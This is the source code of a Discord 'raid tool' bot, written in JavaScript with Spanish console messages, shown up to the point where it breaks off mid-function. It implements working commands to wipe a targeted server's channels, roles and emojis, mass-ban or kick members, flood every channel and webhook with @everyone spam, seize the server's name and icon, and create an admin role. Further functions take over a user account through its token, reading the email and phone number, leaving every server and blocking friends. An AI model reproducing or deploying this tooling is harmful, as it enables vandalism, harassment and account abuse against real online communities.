const { Client, Events, GatewayIntentBits, EmbedBuilder, ChannelType, Colors, WebhookClient, PermissionsBitField } = require('discord.js');
const gradient = require('gradient-string');
const chalk = require('chalk');
const fetch = require('node-fetch');

const args = process.argv.slice(2);
const comando = args[0];
const bot_token = args[1];
const target_guild_id = args[2];
const custom_channel_name = args[3] || "raid-tool";
const custom_role_name = args[4] || "raid tool";
const custom_spam_message = args[5] || "Raid by Simple Raid Tool";

if (!bot_token) {
    console.log(chalk.red("[X] Error: Token no proporcionado."));
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildInvites,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMessageReactions,
        GatewayIntentBits.GuildMessageTyping,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.DirectMessageReactions,
        GatewayIntentBits.DirectMessageTyping,
        GatewayIntentBits.MessageContent
    ]
});

const raid_canal_nombres = [];
const txt_atck_ = "";
const inv_atck = "";
const nm_ch_atck = "";
const nm_rl_atck = "";

async function wait_ms(ms) { return new Promise(resolve => setTimeout(resolve, ms)); };

const asciiArt = `
.▄▄ · ▪  • ▌ ▄ ·.  ▄▄▄·▄▄▌  ▄▄▄ .    ▄▄▄   ▄▄▄· ▪  ·▄▄▄▄      ▄▄▄▄▄            ▄▄▌  
▐█ ▀. ██ ·██ ▐███▪▐█ ▄███•  ▀▄.▀·    ▀▄ █·▐█ ▀█ ██ ██▪ ██     •██  ▪     ▪     ██•  
▄▀▀▀█▄▐█·▐█ ▌▐▌▐█· ██▀·██▪  ▐▀▀▪▄    ▐▀▀▄ ▄█▀▀█ ▐█·▐█· ▐█▌     ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪  
▐█▄▪▐█▐█▌██ ██▌▐█▌▐█▪·•▐█▌▐▌▐█▄▄▌    ▐█•█▌▐█ ▪▐▌▐█▌██. ██      ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌
 ▀▀▀▀ ▀▀▀▀▀  █▪▀▀▀.▀   .▀▀▀  ▀▀▀     .▀  ▀ ▀  ▀ ▀▀▀▀▀▀▀▀•      ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀ 
`;

function banner() {
    console.clear();
    console.log(gradient(['#b700fa', '#ff00e6'])(asciiArt));
    console.log(gradient(['#b700fa', '#ff00e6'])(`\n        Simple Raid Tool\n`));
}

client.on(Events.ClientReady, async () => {
    banner();
    console.log(chalk.cyan(`[i] Bot conectado: ${client.user.tag}`));
    
    if (target_guild_id) {
        console.log(chalk.cyan(`[i] Objetivo: ${target_guild_id}`));
    } else if (comando && !comando.startsWith('token.')) {
        console.log(chalk.yellow(`[!] Advertencia: No se especificó ID de servidor (algunos comandos pueden fallar)`));
    }

    try {
        await ejecutarComando();
    } catch (error) {
        console.log(chalk.red(`[X] Error fatal: ${error.message}`));
    }
});

async function ejecutarComando() {
    let guildxd = null;
    if (target_guild_id) {
        guildxd = client.guilds.cache.get(target_guild_id);
        if (!guildxd && !comando.startsWith('token.')) {
            try {
                guildxd = await client.guilds.fetch(target_guild_id);
            } catch (e) {
                console.log(chalk.red(`[X] No se pudo encontrar el servidor ${target_guild_id}. Asegúrate de que el bot esté dentro.`));
            }
        }
    }

    console.log(chalk.magenta(`[$] Ejecutando módulo: ${comando}...`));

    switch (comando) {
        case "raid_normal":
        case "raid_rtool":
        case "crear_canales":
        case "guild.createchannels":
        case "raid":
            if (!guildxd) return;
            spam_logica(guildxd);
            await crear_canales_masivos(guildxd);
            break;

        case "crear_roles":
        case "createroles":
            if (!guildxd) return;
            await crear_roles_masivos(guildxd);
            break;

        case "eliminar_todo":
        case "nuke":
        case "guild.nuke":
            if (!guildxd) return;
            await nuke_servidor(guildxd);
            break;

        case "on":
            if (!guildxd) return;
            await on_logica(guildxd);
            break;
        
        case "eliminar_canales":
            if (!guildxd) return;
            await eliminar_canales_logica(guildxd);
            break;

        case "eliminar_roles":
        case "deleteroles":
        case "deleteallroles":
            if (!guildxd) return;
            await eliminar_roles_logica(guildxd);
            break;

        case "eliminar_emojis":
        case "delemojis":
            if (!guildxd) return;
            await eliminar_emojis_logica(guildxd);
            break;

        case "massban":
        case "banear_todos":
        case "guild.massban":
            if (!guildxd) return;
            await banear_todos_logica(guildxd);
            break;

        case "banboosters":
             if (!guildxd) return;
             await banear_boosters_logica(guildxd);
             break;

        case "banbots":
             if (!guildxd) return;
             await banear_bots_logica(guildxd);
             break;

        case "onlinemassban":
             if (!guildxd) return;
             await banear_online_logica(guildxd);
             break;
        
        case "massunban":
        case "eliminar_baneos":
             if (!guildxd) return;
             await desbanear_todos_logica(guildxd);
             break;

        case "viewhooks":
        case "obtener_webhooks":
        case "guild.view-hooks":
             if (!guildxd) return;
             await ver_webhooks(guildxd);
             break;
        
        case "abandonar_servidores":
        case "leave":
             if (guildxd) {
                 await guildxd.leave();
                 console.log(chalk.green(`[+] He abandonado el servidor ${guildxd.name}`));
             } else {
                 console.log(chalk.yellow("[!] No se especificó servidor o no lo encuentro."));
             }
             break;

        case "massnick":
            if (!guildxd) return;
            await massnick_logica(guildxd);
            break;

        case "guild":
            if (!guildxd) return;
            await cambiar_servidor_logica(guildxd);
            break;

        case "classic":
            if (!guildxd) return;
            await raid_clasico_logica(guildxd);
            break;

        case "createemojis":
        case "crear_emojis":
            if (!guildxd) return;
            await crear_emojis_logica(guildxd);
            break;

        case "renameroles":
            if (!guildxd) return;
            await renombrar_roles_logica(guildxd);
            break;

        case "wbspam":
        case "guild.webhookspam":
        case "crear_webhooks":
            if (!guildxd) return;
            await wb_spam_logica(guildxd);
            break;

        case "existentwbspam":
        case "guild.existentwebhookspam":
        case "spamear_webhooks":
            if (!guildxd) return;
            await existent_wb_spam_logica(guildxd);
            break;

        case "bypass":
            if (!guildxd) return;
            await bypass_logica(guildxd);
            break;

        case "spam":
        case "guild.spam":
        case "crear_mensajes":
            if (!guildxd) return;
            await spam_logica(guildxd);
            break;

        case "guild.admin":
        case "admin_todos":
            if (!guildxd) return;
            await admin_logica(guildxd);
            break;

        case "eliminar_stickers":
            if (!guildxd) return;
            await eliminar_stickers_logica(guildxd);
            break;

        case "eliminar_invitaciones":
            if (!guildxd) return;
            await eliminar_invitaciones_logica(guildxd);
            break;

        case "eliminar_webhooks":
            if (!guildxd) return;
            await eliminar_webhooks_logica(guildxd);
            break;

        case "kickear_todos":
            if (!guildxd) return;
            await kickear_todos_logica(guildxd);
            break;

        case "silenciar_todos":
            if (!guildxd) return;
            await silenciar_todos_logica(guildxd);
            break;

        case "renombrar_todos":
            if (!guildxd) return;
            await massnick_logica(guildxd);
            break;

        case "guild.info":
            if (!guildxd) return;
            await ver_info_guild(guildxd);
            break;

        case "guild.view-roles":
            if (!guildxd) return;
            await ver_roles(guildxd);
            break;

        case "guild.view-channels":
            if (!guildxd) return;
            await ver_canales(guildxd);
            break;
            
        case "guild.invite":
            if (!guildxd) return;
            await ver_invitaciones(guildxd);
            break;

        
        case "token.info":
            await token_info();
            break;
        case "token.guilds":
            await token_guilds();
            break;
        case "token.admin-guilds":
            await token_admin_guilds();
            break;
        case "token.owner-guilds":
            await token_owner_guilds();
            break;
        case "token.leave-guilds":
            await token_leave_guilds();
            break;
        case "token.block-friends":
            await token_block_friends();
            break;
        case "token.delete-friends":
            await token_delete_friends();
            break;
        case "token.close-mds":
            await token_close_mds();
            break;
        case "token.theme-spam":
            await token_theme_spam();
            break;

        default:
            console.log(chalk.yellow(`[?] Comando '${comando}' no reconocido o no implementado completamente.`));
            break;
    }
}

async function eliminar_canales_logica(guildxd) {
    let nk = false;
    let nk_number = 0;
    const ch_size = guildxd.channels.cache.size;

    console.log(chalk.magenta(`[-] Iniciando eliminación de ${ch_size} canales...`));

    async function delete_ch(ch_id) {
        try {
            const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}`,{
                method:"DELETE",
                headers:{
                    "Authorization":`Bot ${bot_token}`,
                    "Content-Type":"application/json"
                },
                body: JSON.stringify({
                    "X-Audit-Log-Reason":"Simple Raid Tool"
                })
            });
            const resJson = await res.json();
            if(res.status === 429){
                console.log(chalk.cyan(`[i] Rate limit detectado (${resJson['retry_after']}s), reintentando...`));
                await wait_ms(resJson['retry_after'] * 1000);
                await delete_ch(ch_id);
            }
            if(res.status === 200 || res.status === 204){
                nk_number++;
                console.log(chalk.red(`[-] Canal eliminado (${nk_number}/${ch_size})`));
            }
        } catch (e) {}
    }

    const chs = await guildxd.channels.fetch();
    const promesas = [];
    for (let ch of chs.values()) {
        promesas.push(delete_ch(ch.id));
        await wait_ms(20);
    }
    await Promise.allSettled(promesas);
    console.log(chalk.green(`[+] Eliminación de canales finalizada.`));
}

async function eliminar_roles_logica(guildxd) {
    console.log(chalk.magenta(`[-] Iniciando eliminación de roles...`));
    let rl_number = 0;
    const rolesxd = await guildxd.roles.fetch();
    for (let rolxd of rolesxd.values()) {
        try {
            if (rolxd.managed || rolxd.name === '@everyone') continue;
            
            await rolxd.delete();
            rl_number++;
            console.log(chalk.red(`[-] Rol eliminado: ${rolxd.name}`));
        } catch (e) {}
    }
    console.log(chalk.green(`[+] ${rl_number} roles eliminados.`));
}

async function nuke_servidor(guildxd) {
    await eliminar_canales_logica(guildxd);
    
    try {
        const ch = await guildxd.channels.create({
            name: `nuked-by-raid-tool`,
            type: ChannelType.GuildText
        });
        await ch.send({
            content:`${custom_spam_message} \n@everyone`, 
            embeds:[
                new EmbedBuilder()
                .setTitle(` ‎                           ‎ **SERVER RAIDED**\n ‎                                 ‎ **#SIMPLE RAID TOOL**`)
                .setDescription(`:gem:\n\n**🌎 best raid bot.**`)
                .setImage(`https://i.pinimg.com/originals/ff/ba/6d/ffba6d9dd5c11cd9545b035ed8d55750.gif`)
            ]
        });
        console.log(chalk.green(`[+] Nuke finalizado. Canal de aviso creado.`));
    } catch (e) {
        console.log(chalk.red(`[X] Error creando canal post-nuke: ${e.message}`));
    }
}

async function crear_canales_masivos(guildxd) {
    console.log(chalk.magenta(`[+] Iniciando creación masiva de canales...`));
    let raidk_number = 0;

    async function spam_ch(ch_id) {
        try {
            for (let index = 0; index < 20; index++) {
                fetch(`https://discord.com/api/v9/channels/${ch_id}/messages`, {
                    method: 'POST',
                    headers: {
                        "Authorization": `Bot ${bot_token}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        content: `${custom_spam_message} \n@everyone`,
                        embeds: [{
                            title: `SERVER RAIDED`,
                            image: { url: `https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif` }
                        }]
                    })
                }).catch(() => {});
            }
        } catch (e) {}
    }

    async function crear_ch(channel_name) {
        try {
            const res = await fetch(`https://discord.com/api/v9/guilds/${guildxd.id}/channels`, {
                method: 'POST',
                headers: {
                    "Authorization": `Bot ${bot_token}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: `${channel_name}`,
                    type: 0
                }),
            });
            const resJson = await res.json();
            if(res.status === 429){
                await wait_ms(resJson["retry_after"] * 1000);
                await crear_ch(channel_name);
            } else if (res.status === 200 || res.status === 201) {
                raidk_number++;
                console.log(chalk.green(`[+] Canal creado: ${channel_name} (${raidk_number})`));
                if (resJson.id) spam_ch(resJson.id);
            }
        } catch (e) {
            console.log(chalk.red(`[X] Error creando canal: ${e.message}`));
        }
    }

    const limit = 100; 
    console.log(chalk.yellow(`[i] Creando ${limit} canales (ajustado para seguridad)...`));
    
    for (let index = 0; index < limit; index++) {
        let name = custom_channel_name;
        if(name === ""){
            const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
            name = raid_canal_nombres[randomNameIndex];
        }
        crear_ch(name);
        await wait_ms(50);
    }
}

async function crear_roles_masivos(guildxd) {
    console.log(chalk.magenta(`[+] Creando roles masivos...`));
    let rl_i = 0;
    const limit = 50; 
    for (let index = 0; index < limit; index++) {
        try {
            await guildxd.roles.create({
                name: custom_role_name, 
                color: Colors.DarkPurple, 
                reason: custom_spam_message
            });
            rl_i++;
            console.log(chalk.green(`[+] Rol creado (${rl_i})`));
            await wait_ms(100);
        } catch (e) {
            console.log(chalk.red(`[X] Error creando rol: ${e.message}`));
        }
    }
}

async function banear_todos_logica(guildxd) {
    console.log(chalk.magenta(`[X] Iniciando Mass Ban...`));
    let m_i = 0;
    const ms = await guildxd.members.fetch();
    for (let m of ms.values()) {
        if (m.bannable) {
            try {
                await m.ban({ reason: custom_spam_message });
                m_i++;
                console.log(chalk.red(`[X] Usuario baneado: ${m.user.tag}`));
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${m_i} usuarios baneados.`));
}

async function banear_boosters_logica(guildxd) {
    console.log(chalk.magenta(`[X] Baneando Boosters...`));
    let m_i = 0;
    let ms_b = (await guildxd.members.fetch()).filter(member => member.premiumSinceTimestamp);
    for (let m_b of ms_b.values()) {
        if (m_b.bannable) {
            try {
                await m_b.ban({ reason: custom_spam_message });
                m_i++;
                console.log(chalk.red(`[X] Booster baneado: ${m_b.user.tag}`));
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${m_i} boosters baneados.`));
}

async function banear_bots_logica(guildxd) {
    console.log(chalk.magenta(`[X] Baneando Bots...`));
    let m_i = 0;
    const ms = await guildxd.members.fetch();
    let ms_bot = ms.filter(m => m.user.bot);
    for (let m_bot of ms_bot.values()) {
        if (m_bot.bannable) {
            try {
                await m_bot.ban({ reason: custom_spam_message });
                m_i++;
                console.log(chalk.red(`[X] Bot baneado: ${m_bot.user.tag}`));
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${m_i} bots baneados.`));
}

async function banear_online_logica(guildxd) {
    console.log(chalk.magenta(`[X] Baneando Usuarios Online...`));
    let m_i = 0;
    const ms = await guildxd.members.fetch({ withPresences: true });
    let ms_online = ms.filter(m => m.presence?.status === "online" || m.presence?.status === "dnd" || m.presence?.status === "idle");
    for (let m of ms_online.values()) {
        if (m.bannable) {
            try {
                await m.ban({ reason: custom_spam_message });
                m_i++;
                console.log(chalk.red(`[X] Online User baneado: ${m.user.tag}`));
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${m_i} usuarios online baneados.`));
}

async function desbanear_todos_logica(guildxd) {
    console.log(chalk.magenta(`[+] Desbaneando a todos...`));
    let m_i = 0;
    try {
        const bans = await guildxd.bans.fetch();
        for (let banInfo of bans.values()) {
            try {
                await guildxd.members.unban(banInfo.user.id);
                m_i++;
                console.log(chalk.green(`[+] Usuario desbaneado: ${banInfo.user.tag}`));
            } catch (e) {}
        }
    } catch(e) { console.log(e.message); }
    console.log(chalk.green(`[+] ${m_i} usuarios desbaneados.`));
}

async function eliminar_emojis_logica(guildxd) {
    console.log(chalk.magenta(`[-] Eliminando emojis...`));
    let emj_i = 0;
    const emjs = await guildxd.emojis.fetch();
    for (let emj of emjs.values()) {
        try {
            await emj.delete();
            emj_i++;
            console.log(chalk.red(`[-] Emoji eliminado: ${emj.name}`));
        } catch (e) {}
    }
    console.log(chalk.green(`[+] ${emj_i} emojis eliminados.`));
}

async function ver_webhooks(guildxd) {
    console.log(chalk.magenta(`[?] Escaneando webhooks...`));
    const chs = await guildxd.channels.fetch();
    let found = 0;
    for (let ch of chs.values()) {
        try {
            if (ch.isTextBased()) {
                let whs = await ch.fetchWebhooks();
                for (let wh of whs.values()) {
                    console.log(chalk.cyan(`[W] Webhook: ${wh.name} | URL: ${wh.url}`));
                    found++;
                }
            }
        } catch(e) {}
    }
    console.log(chalk.green(`[+] Se encontraron ${found} webhooks.`));
}

async function massnick_logica(guildxd) {
    console.log(chalk.magenta(`[X] Iniciando Mass Nickname...`));
    let m_i = 0;
    let ms = await guildxd.members.fetch();
    for (let m of ms.values()) {
        try {
            await m.setNickname(custom_role_name);
            m_i++;
            console.log(chalk.green(`[+] Nickname cambiado: ${m.user.tag}`));
        } catch (e) {
            
        }
    }
    console.log(chalk.green(`[+] ${m_i} miembros renombrados.`));
}

async function cambiar_servidor_logica(guildxd) {
    try {
        await guildxd.setName(custom_role_name);
        await guildxd.setIcon("https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=1024");
        console.log(chalk.green(`[+] Se cambió el ícono y nombre del servidor.`));
    } catch (e) {
        console.log(chalk.red(`[X] Error al cambiar info del servidor: ${e.message}`));
    }
}

async function raid_clasico_logica(guildxd) {
    console.log(chalk.magenta(`[+] Empezando raid clásico (lento)...`));
    
    async function spam_ch(ch_id) {
        try {
            const chxd = guildxd.channels.cache.get(ch_id);
            for (let index = 0; index < 20; index++) {
                chxd.send({content:`${custom_spam_message} \n@everyone`, embeds:[
                    new EmbedBuilder()
                    .setTitle(`SERVER RAIDED`)
                    .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                ]}).catch(()=>{});
            }
        } catch (e) {}
    }

    const limit = 20; 
    for (let index = 0; index < limit; index++) {
        try {
            let name = custom_channel_name;
            if(name === ""){
                const randomNameIndex = Math.floor(Math.random() * raid_canal_nombres.length);
                name = raid_canal_nombres[randomNameIndex];
            }
            const ch = await guildxd.channels.create({name: name, type: ChannelType.GuildText});
            console.log(chalk.green(`[+] Canal clásico creado: ${ch.name}`));
            spam_ch(ch.id);
        } catch (e) {
            console.log(chalk.red(`[X] Error: ${e.message}`));
        }
        await wait_ms(200);
    }
}

async function crear_emojis_logica(guildxd) {
    console.log(chalk.magenta(`[+] Creando emojis...`));
    let emj_i = 0;
    const limit = 20;
    let b64_png = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADwCAYAAABbuBvtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAJwPSURBVHhe7f1nnF7XdeYLLqBQuQpVyJkIDGCOorIoUVm2HNp2t7tty3fu7860e2Y+zcf55P42v/nWfd3Xd9zd7tvt69iWWlbONi1SlEiKOSDnjELlHICa57/WXu97qlAgCUoWqopYhYVzzj47nb2fZ++1wznviitXrszaTXkTWVGO71Cuq3TTc0nzZ0r6ZrW+U3nk0Q/aynJ+U64pAGzWZmcXBhrOqQuJQgrg3CxH6axdqalxnA29UtTd3xYprp2vquDn7fi7KXW5SYy3EABFp7owuLhOd44BcMCe95AAerrHvfRbI4f7nbUVIg46N46FNfMUac6/HzI/z/Uwc91vyly5SYy3JVXAFeA6eCvXtftzAb9ixWU1/jqvEGOFziOO4ubX4VYnxVytEclJkJp50Wkt/bnAX7FihSsis3nOvZtybblJjLchAViAeFmgmhHAZvw4q2vcXKvALoCfnb0s0yh09orU/RZQQxj81ZR7xEsa4Tc14sh0da64HOSkQVwlTOQlSBbpc9TtChFukuLtyc3B95tKtq4AdIFi8tY3TmmUV6zMdibcA5iFLPjLcQPhaqeca2xRzDW8qI1XGMWlSIV/JwGKROuPRoTeI3CuY8PKBmtY1RBhZxUW52u0fStreb0p84XB901ivKkA2mzlKaZKUenUQe3ArrunG8VKy47JtbIQ44q708oHAQiVoMdvhAXjAX6uZ2au2PT0tI6Ki5tF0u/KlYK+QL5q1SpraWmxtrZ2a2psUhwNSg/SrCzxZbwhTqjK9U2py01ivKVQNIAbUAagA5A6F1c4zly+bJelHGcA8OUZuzwzo2OaMiLBSsWjYsYPJIAVqxrUsquFB90enycXhEpizSieyclpm5iYtKmpqRp5iAOikA55oqeAFF3dXbZmzVprb+tQ/I2KUPFLIU5jY6Mr50mKPL8pc+VdTow6IAAbUsdImC2AOswogV2An5mZtmlpAB8izNj4+LiNT4w7cAHw9PSU7gPgAnb9jylFbwHQcc/WvaWl2cEKsGn5yRIkI/y0/E47KaaUxoTSmKgRj3Qnp5QXpTWt88siIXF2dnaIHN3W3tqmOEWMFavUW61SGs1+r7Oz09rb26y5uUXa7NrQID9XmVXk/GrCUE7vBiK9S4lRKrb21AFaxOscEGMCCcAAWlcC37gNjwzZ8NCQjY6N2tTklIN8amrSRkdHbUzADXMnBscYMB6ZR0jc2QsQp1lzU5MA2uogbWlptaamVQKyWm/5A/hTAvwUwJ+6rLSCHJOTk06GCRHECajzKaXn7soPca8UwSAIR5tdKTey0KD0mpVWuxOjc3WndYs869aus3Xr1llX1xq/19QUvQn5jIYiepXswcKN+DSWUW+3nOXdS4zKEwNUX1RTxTuOV2DvxwzQ5cvTaq1Hrb+/xy5d6rGBgQEH5lQhAS14ttrE4Ra9wAVwGAAHrTQOULwAijRonAFhq3qLVvUazS1N1igwgzVmriJeEUNxTk/LZJISP8SDLKNj6qGkU1PyJ+RzhDD0MvRi9DT0IF6tUkwuiL9Sfw1Kp0mk7FrdZRs2bLRNmzfb5k2bbdOmTbZ+wwZb073Ge7DIJ71I9CRVYuTzLWd5dxJjFvTXJchA5WP+qKcocJ6enrChoQG7cOGc9IyfA7KVDYBlVi025hTEAIhh+xNXmEWMHyAC2IziDRMkxhwAi16iSSBsapSp4608PQpxSokbgsxo6K/BN+B300pp0VtgWkESam5afqYhRRLDSRTPgU7KP+MUzD96FbID+Bmk04OsFkk2bdxkt+zcZbuk69ev9x6kra1N/priWQqp4xmW/4zWTWK";

    for (let index = 0; index < limit; index++) {
        try {
            await guildxd.emojis.create({name:`raidtool`, attachment:b64_png});
            emj_i++;
            console.log(chalk.green(`[+] Emoji creado (${emj_i})`));
        } catch (e) {
            console.log(chalk.red(`[X] Error: ${e.message}`));
        }
    }
}

async function renombrar_roles_logica(guildxd) {
    console.log(chalk.magenta(`[X] Renombrando roles...`));
    let rls = await guildxd.roles.fetch();
    let rl_i = 0;
    for (let rl of rls.values()) {
        try {
            await rl.setName(custom_role_name);
            rl_i++;
            console.log(chalk.green(`[+] Rol renombrado: ${rl.id}`));
        } catch (e) {
           
        }
    }
    console.log(chalk.green(`[+] ${rl_i} roles renombrados.`));
}

async function wb_spam_logica(guildxd) {
    console.log(chalk.magenta(`[X] Iniciando Webhook Spam...`));
    
    async function spam_wh(wh_url) {
        try {
            const whxd = new WebhookClient({url:wh_url});
            for (let index = 0; index < 20; index++) {
                whxd.send({content:`${custom_spam_message} \n@everyone`, embeds:[
                    new EmbedBuilder()
                    .setTitle(`SERVER RAIDED`)
                    .setImage(`https://i.pinimg.com/originals/ff/ba/6d/ffba6d9dd5c11cd9545b035ed8d55750.gif`)
                ]}).catch(()=>{});
            }
        } catch (e) {}
    }

    let i_wh=0;
    let webhooks = [];

    async function create_webhok(ch_id) {
        try {
            const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}/webhooks`,{
                method:"POST",
                headers:{
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    "name": custom_spam_message
                })
            });
            const resJson = await res.json();
            if(res.status === 200){
                i_wh++;
                const wh_url = `https://discord.com/api/webhooks/${resJson['id']}/${resJson['token']}`;
                console.log(chalk.green(`[+] Webhook creado en ${ch_id}`));
                spam_wh(wh_url);
            } else if(res.status === 429){
                if(resJson['retry_after']){
                    await wait_ms(resJson['retry_after'] * 1000 + 100);
                    await create_webhok(ch_id);
                }
            }
        } catch (e) { console.log(e.message); }
    }

    let chs = await guildxd.channels.fetch();
    for (let ch of chs.values()) {
        if (ch.isTextBased()) {
            create_webhok(ch.id);
            await wait_ms(50);
        }
    }
}

async function existent_wb_spam_logica(guildxd) {
    console.log(chalk.magenta(`[X] Spameando webhooks existentes...`));
    
    async function spam_wh(wh_url) {
        try {
            const whxd = new WebhookClient({url:wh_url});
            for (let index = 0; index < 20; index++) {
                whxd.send({content:`${custom_spam_message} \n@everyone`, embeds:[
                    new EmbedBuilder()
                    .setTitle(`SERVER RAIDED`)
                    .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                ]}).catch(()=>{});
            }
        } catch (e) {}
    }

    let wh_i = 0;
    let chs = await guildxd.channels.fetch();
    for (let ch of chs.values()) {
        if (ch.isTextBased()) {
            let whs = await ch.fetchWebhooks();
            for (let wh of whs.values()) {
                console.log(chalk.green(`[+] Spameando webhook: ${wh.name}`));
                spam_wh(wh.url);
                wh_i++;
            }
        }
    }
    console.log(chalk.green(`[+] ${wh_i} webhooks spameadas.`));
}

async function bypass_logica(guildxd) {
    console.log(chalk.magenta(`[X] Iniciando Bypass Raid...`));
    
    await spam_logica(guildxd);

    console.log(chalk.magenta(`[X] Renombrando canales (Bypass)...`));
    
    async function rename_ch(ch_id) {
        try {
            const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}`,{
                method:"PATCH",
                headers:{
                    "Authorization":`Bot ${bot_token}`,
                    "content-type":"application/json"
                },
                body: JSON.stringify({
                    name:`bypassed-by-raid-tool`
                })
            });
            const resJson = await res.json();
            if(res.status === 200){
                console.log(chalk.green(`[+] Canal renombrado: ${ch_id}`));
            } else if (resJson['retry_after']) {
                await wait_ms(resJson['retry_after'] * 1000);
                await rename_ch(ch_id);
            }
        } catch (e) {
            console.log(e.message);
        }
    }

    let chs = await guildxd.channels.fetch();
    for (let ch of chs.values()) {
        rename_ch(ch.id);
        await wait_ms(50);
    }
}

async function spam_logica(guildxd) {
    console.log(chalk.magenta(`[+] Spameando todos los canales...`));
    
    async function spam_ch(ch_id) {
        const chxd = guildxd.channels.cache.get(ch_id);
        if (!chxd) return;
        for (let index = 0; index < 20; index++) {
            try {
                chxd.send({content:`${custom_spam_message} \n@everyone`, embeds:[
                    new EmbedBuilder()
                    .setTitle(`SERVER RAIDED`)
                    .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                ]}).catch(()=>{});
            } catch (e) {}
        }
    }

    const chs = await guildxd.channels.fetch();
    for (let ch of chs.values()) {
        if (ch.isTextBased()) {
            spam_ch(ch.id);
        }
    }
}

async function admin_logica(guildxd) {
    console.log(chalk.magenta(`[+] Creando rol de administrador...`));
    try {
        const roll = await guildxd.roles.create({
            name: custom_role_name,
            reason: custom_spam_message, 
            permissions: PermissionsBitField.Flags.Administrator
        });
        
        console.log(chalk.green(`[+] Rol Admin creado: ${roll.name}. Asignalo manualmente si es necesario.`));
        
    } catch (e) {
        console.log(chalk.red(`[X] Error: ${e.message}`));
    }
}

async function ver_info_guild(guildxd) {
    console.log(chalk.cyan(`\n=== Información del Servidor ===`));
    console.log(`Nombre: ${guildxd.name}`);
    console.log(`ID: ${guildxd.id}`);
    console.log(`Miembros: ${guildxd.memberCount}`);
    console.log(`Canales: ${guildxd.channels.cache.size}`);
    console.log(`Roles: ${guildxd.roles.cache.size}`);
    console.log(`Emojis: ${guildxd.emojis.cache.size}`);
    console.log(`Owner ID: ${guildxd.ownerId}`);
}

async function ver_roles(guildxd) {
    console.log(chalk.cyan(`\n=== Roles del Servidor ===`));
    const roles = await guildxd.roles.fetch();
    roles.forEach(role => {
        console.log(`${role.name} - ${role.id}`);
    });
}

async function ver_canales(guildxd) {
    console.log(chalk.cyan(`\n=== Canales del Servidor ===`));
    const channels = await guildxd.channels.fetch();
    channels.forEach(channel => {
        console.log(`${channel.name} - [${channel.type}] - ${channel.id}`);
    });
}

async function ver_invitaciones(guildxd) {
    console.log(chalk.cyan(`\n=== Invitaciones del Servidor ===`));
    try {
        const invites = await guildxd.invites.fetch();
        invites.forEach(inv => {
            console.log(`${inv.code} - Usos: ${inv.uses}`);
        });
    } catch (e) {
        console.log(chalk.red(`[X] No tengo permisos para ver invitaciones.`));
    }
}

async function token_info() {
    console.log(chalk.magenta(`[?] Obteniendo info del token...`));
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me`, {
            headers: { "Authorization": bot_token }
        });
        if (res.status !== 200) throw new Error("Token inválido");
        const json = await res.json();
        console.log(chalk.cyan(`\n=== User Info ===`));
        console.log(`User: ${json.username}#${json.discriminator}`);
        console.log(`ID: ${json.id}`);
        console.log(`Email: ${json.email}`);
        console.log(`Phone: ${json.phone}`);
    } catch (e) {
        console.log(chalk.red(`[X] Error: ${e.message}`));
    }
}

async function token_guilds() {
    console.log(chalk.magenta(`[?] Listando servidores del token...`));
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
            headers: { "Authorization": bot_token }
        });
        const guilds = await res.json();
        console.log(chalk.cyan(`Total: ${guilds.length}`));
        guilds.forEach(g => console.log(`${g.name} (${g.id})`));
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function token_admin_guilds() {
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
            headers: { "Authorization": bot_token }
        });
        const guilds = await res.json();
        const adm_perms = BigInt(0x00000008);
        const admins = guilds.filter(g => (BigInt(g.permissions) & adm_perms) !== BigInt(0));
        console.log(chalk.cyan(`Servidores con Admin: ${admins.length}`));
        admins.forEach(g => console.log(`${g.name} (${g.id})`));
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function token_owner_guilds() {
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
            headers: { "Authorization": bot_token }
        });
        const guilds = await res.json();
        const owners = guilds.filter(g => g.owner);
        console.log(chalk.cyan(`Servidores Owner: ${owners.length}`));
        owners.forEach(g => console.log(`${g.name} (${g.id})`));
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function token_leave_guilds() {
    console.log(chalk.magenta(`[!] Abandonando todos los servidores...`));
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
            headers: { "Authorization": bot_token }
        });
        const guilds = await res.json();
        for (const g of guilds) {
            await fetch(`https://discord.com/api/v9/users/@me/guilds/${g.id}`, {
                method: "DELETE",
                headers: { "Authorization": bot_token }
